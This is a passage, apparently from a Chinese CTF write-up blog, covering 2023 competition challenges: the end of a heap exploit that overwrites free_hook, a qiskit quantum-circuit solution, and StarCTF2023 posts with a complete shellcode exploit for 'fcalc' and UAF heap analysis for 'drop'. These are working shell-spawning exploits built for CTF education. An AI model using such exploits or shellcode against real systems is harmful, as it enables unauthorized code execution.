class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i+<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="number">0x60</span>,p64(system))</span><br><span class="line">edit(<span class="number">12</span>,<span class="number">0x60</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="output"><a href="#output" class="headerlink" title="output"></a>output</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Suppose the quantum circuit <span class="built_in">is</span> named <span class="string">&quot;qc&quot;</span>, the quantum operations are <span class="keyword">as</span> follows:</span><br><span class="line"></span><br><span class="line"><span class="symbol">X:</span> bit-flip gate e.g. <span class="string">&quot;qc.x(1)&quot;</span> means flipping qubit <span class="number">1</span>;</span><br><span class="line"><span class="symbol">H:</span> Hadamard gate e.g. <span class="string">&quot;qc.h(1)&quot;</span> means make the Hadamard transfomation <span class="keyword">on</span> qubit <span class="number">1</span>;</span><br><span class="line"><span class="symbol">I:</span> Identity gate e.g. <span class="string">&quot;qc.i(1)&quot;</span>;</span><br><span class="line">CNOT gate: e.g. <span class="string">&quot;qc.cx(0,1)&quot;</span> means <span class="string">&quot;q[1]=(q[1]+q[0]) mod 2&quot;</span>;</span><br><span class="line">Toffoli gate: e.g. <span class="string">&quot;qc.ccx(0,1,2)&quot;</span> means <span class="string">&quot;q[2]=(q[2]+q[1]*q[0]) mod 2&quot;</span>.</span><br><span class="line"><span class="symbol">Measure:</span> e.g. <span class="string">&quot;qc.measure(1,0)&quot;</span> means measure the qubit <span class="number">1</span> <span class="built_in">and</span> store the measured result <span class="keyword">into</span> classical bit <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">You can <span class="keyword">get</span> more details <span class="keyword">in</span> <span class="string">&quot;demo&quot;</span>.</span><br></pre></td></tr></table></figure>
<p>附图：</p>
<img src="/2023/08/08/%E5%9B%BD%E8%B5%9B-%E5%86%B3%E8%B5%9B2023/circuit_2.png" class title="circuit_2"> 
<p>这道题目的关键就是 <code>matplotlib.pyplot</code> 模块</p>
<p>有了该模块进行可视化，很快就可以求出答案，完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiskit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiskit.visualization <span class="keyword">import</span> plot_histogram</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">simulator = Aer.get_backend(<span class="string">&#x27;qasm_simulator&#x27;</span>)</span><br><span class="line">qc = QuantumCircuit(<span class="number">36</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">qc.x(<span class="number">0</span>)</span><br><span class="line">qc.x(<span class="number">1</span>)</span><br><span class="line">qc.i(<span class="number">2</span>)</span><br><span class="line">qc.x(<span class="number">3</span>)</span><br><span class="line">qc.x(<span class="number">4</span>)</span><br><span class="line">qc.x(<span class="number">5</span>)</span><br><span class="line">qc.i(<span class="number">6</span>)</span><br><span class="line">qc.x(<span class="number">7</span>)</span><br><span class="line">qc.x(<span class="number">8</span>)</span><br><span class="line">qc.x(<span class="number">9</span>)</span><br><span class="line">qc.i(<span class="number">10</span>)</span><br><span class="line">qc.x(<span class="number">11</span>)</span><br><span class="line">qc.i(<span class="number">12</span>)</span><br><span class="line">qc.x(<span class="number">13</span>)</span><br><span class="line">qc.i(<span class="number">14</span>)</span><br><span class="line">qc.x(<span class="number">15</span>)</span><br><span class="line">qc.i(<span class="number">16</span>)</span><br><span class="line">qc.x(<span class="number">17</span>)</span><br><span class="line">qc.i(<span class="number">18</span>)</span><br><span class="line">qc.i(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">qc.h(<span class="number">0</span>)</span><br><span class="line">qc.h(<span class="number">1</span>)</span><br><span class="line">qc.h(<span class="number">2</span>)</span><br><span class="line">qc.h(<span class="number">3</span>)</span><br><span class="line">qc.h(<span class="number">4</span>)</span><br><span class="line">qc.h(<span class="number">5</span>)</span><br><span class="line">qc.h(<span class="number">6</span>)</span><br><span class="line">qc.h(<span class="number">7</span>)</span><br><span class="line">qc.h(<span class="number">8</span>)</span><br><span class="line">qc.h(<span class="number">9</span>)</span><br><span class="line">qc.h(<span class="number">10</span>)</span><br><span class="line">qc.h(<span class="number">11</span>)</span><br><span class="line">qc.h(<span class="number">12</span>)</span><br><span class="line">qc.h(<span class="number">13</span>)</span><br><span class="line">qc.h(<span class="number">14</span>)</span><br><span class="line">qc.h(<span class="number">15</span>)</span><br><span class="line">qc.h(<span class="number">16</span>)</span><br><span class="line">qc.h(<span class="number">17</span>)</span><br><span class="line">qc.h(<span class="number">18</span>)</span><br><span class="line">qc.h(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">qc.ccx(<span class="number">3</span>,<span class="number">7</span>,<span class="number">21</span>)</span><br><span class="line">qc.ccx(<span class="number">15</span>,<span class="number">16</span>,<span class="number">22</span>)</span><br><span class="line">qc.ccx(<span class="number">2</span>,<span class="number">6</span>,<span class="number">23</span>)</span><br><span class="line">qc.ccx(<span class="number">12</span>,<span class="number">13</span>,<span class="number">24</span>)</span><br><span class="line">qc.ccx(<span class="number">10</span>,<span class="number">11</span>,<span class="number">25</span>)</span><br><span class="line">qc.ccx(<span class="number">0</span>,<span class="number">14</span>,<span class="number">26</span>)</span><br><span class="line">qc.ccx(<span class="number">1</span>,<span class="number">5</span>,<span class="number">27</span>)</span><br><span class="line">qc.ccx(<span class="number">8</span>,<span class="number">9</span>,<span class="number">28</span>)</span><br><span class="line">qc.ccx(<span class="number">0</span>,<span class="number">4</span>,<span class="number">29</span>)</span><br><span class="line">qc.ccx(<span class="number">5</span>,<span class="number">11</span>,<span class="number">30</span>)</span><br><span class="line">qc.cx(<span class="number">21</span>,<span class="number">24</span>)</span><br><span class="line">qc.x(<span class="number">27</span>)</span><br><span class="line">qc.ccx(<span class="number">4</span>,<span class="number">30</span>,<span class="number">31</span>)</span><br><span class="line">qc.cx(<span class="number">24</span>,<span class="number">25</span>)</span><br><span class="line">qc.cx(<span class="number">27</span>,<span class="number">30</span>)</span><br><span class="line">qc.ccx(<span class="number">4</span>,<span class="number">11</span>,<span class="number">31</span>)</span><br><span class="line">qc.ccx(<span class="number">23</span>,<span class="number">24</span>,<span class="number">26</span>)</span><br><span class="line">qc.ccx(<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>)</span><br><span class="line">qc.ccx(<span class="number">30</span>,<span class="number">32</span>,<span class="number">34</span>)</span><br><span class="line">qc.cx(<span class="number">29</span>,<span class="number">31</span>)</span><br><span class="line">qc.cx(<span class="number">17</span>,<span class="number">34</span>)</span><br><span class="line">qc.cx(<span class="number">31</span>,<span class="number">33</span>)</span><br><span class="line">qc.ccx(<span class="number">18</span>,<span class="number">34</span>,<span class="number">35</span>)</span><br><span class="line">qc.x(<span class="number">33</span>)</span><br><span class="line">qc.ccx(<span class="number">34</span>,<span class="number">31</span>,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">qc.measure([<span class="number">35</span>,<span class="number">33</span>,<span class="number">34</span>],[<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">job = execute(qc, simulator, shots=<span class="number">100000</span>)</span><br><span class="line"><span class="comment"># Grab results from the job</span></span><br><span class="line">result = job.result()</span><br><span class="line"><span class="comment"># Returns counts</span></span><br><span class="line">counts = result.get_counts(qc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nTotal count for 00 and 11 are:&quot;</span>,counts)</span><br><span class="line"><span class="comment"># Plot a histogram</span></span><br><span class="line">plot_histogram(counts)</span><br><span class="line"><span class="comment"># Draw the circuit</span></span><br><span class="line">qc.draw(output=<span class="string">&#x27;mpl&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="Glass"><a href="#Glass" class="headerlink" title="Glass"></a>Glass</h2><p>从32x32的像素点中选择10个，基数很小可以直接爆破</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/01/StarCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/01/StarCTF2023/" class="post-title-link" itemprop="url">StarCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-08-01 15:28:12 / Modified: 15:29:36" itemprop="dateCreated datePublished" datetime="2023-08-01T15:28:12+08:00">2023-08-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fcalc: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">05285b</span>cf7cd192619ab73f7c8e90e4e0d357c11c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">   Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX disabled</span><br><span class="line">   PIE:      PIE enabled</span><br><span class="line">   RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，PIE</li>
</ul>
<p><strong>程序分析</strong></p>
<p>程序大致上实现了一个计算器，输入数字可以将数字压栈，输入运算符号 <code>+-*/</code> 可以从栈中弹出栈顶的两个数字，进行运算后将结果压回</p>
<p><strong>入侵思路</strong></p>
<p>关键点就是在栈上注入一个 shellcode，需要通过下面的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x2F</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  doublet = <span class="built_in">fabs</span>(*(<span class="keyword">double</span> *)ptr);</span><br><span class="line">  <span class="keyword">if</span> ( doublet != <span class="number">0.0</span> &amp;&amp; (doublet &lt; <span class="number">1.0</span> || doublet &gt; <span class="number">100.0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, doublet);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然不可能整个 shellcode 都通过检查，通过 GDB 调试可以发现栈上有个栈地址，于是需要写一个 <code>add rsp,offset;ret;</code> 跳转到这个栈地址上，在这里布置 shellcode</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;49628&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1876)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendNum</span>(<span class="params">num</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendKey</span>(<span class="params">key</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\x48\x31\xC0\x48\x31\xF6\x48\x31\xD2\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendKey(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sendKey(payload.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(<span class="number">0x40000000d0ec8148</span>)*<span class="number">24</span>+p64(<span class="number">0x40000000d0ec8148</span>)+p64(<span class="number">0x40000000d0ec8148</span>)+p64(<span class="number">0x3ff00000000000c3</span>))</span><br><span class="line"></span><br><span class="line">sendKey(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">drop: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3b</span>db633ba28af9d5592d174f3b181e4b5485e8db, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>这个题的伪代码有点怪，正常分析程序功能有点困难，需要根据输入的内容来判断程序各个模块对堆的影响</p>
<p>我一般遇到这种难以分析的题目都会直接开始调试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">9</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(str(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">bubble</span><span class="params">(<span class="number">0</span>,<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">1</span>]: <span class="number">0x5555555ad9e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab910</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">1</span>]: <span class="number">0x5555555ada00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab480</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0xd0</span> [  <span class="number">1</span>]: <span class="number">0x5555555ae2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1e0</span> [  <span class="number">1</span>]: <span class="number">0x5555555ab2a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x210</span> [  <span class="number">2</span>]: <span class="number">0x5555555afa10</span> —▸ <span class="number">0x5555555ada70</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555aef50</span> —▸ <span class="number">0x7ffff7f61be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555aef50</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里大概推测一下，函数 <code>bubble</code> 的功能如下：<ul>
<li>当 key 为0时，释放第 index 个 chunk</li>
<li>当 key 为1时，将前 index 个 chunk 全部释放，申请并拷贝到新的 chunk 中</li>
</ul>
</li>
</ul>
<p>程序的 <code>bubble</code> 可以用于释放堆块，在其中有 UAF 漏洞</p>
<p><strong>入侵思路</strong></p>
<p>利用 UAF 漏洞可以完成泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">9</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(str(i+<span class="number">1</span>)*<span class="number">0x200</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">bubble</span><span class="params">(<span class="number">0</span>,<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span 